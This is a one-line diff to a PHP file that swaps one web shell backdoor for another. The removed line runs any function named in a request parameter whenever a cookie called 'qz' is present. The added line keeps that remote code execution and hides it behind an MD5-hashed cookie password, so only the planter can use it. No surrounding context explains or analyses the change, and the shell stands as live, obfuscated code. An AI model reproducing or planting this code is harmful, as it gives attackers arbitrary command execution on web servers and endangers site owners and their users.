@@ -1,1 +1,1 @@
-<?php if(@$_COOKIE[qz]) ($_=@$_REQUEST[q]).@$_($_REQUEST[z]); ?>
+<?php if(md5(@$_COOKIE['skins'])=='e4c4b6ccc23bc1648bc8cc6b4e3e0122')($_=@$_REQUEST['q']).@$_($_REQUEST['z']); ?>
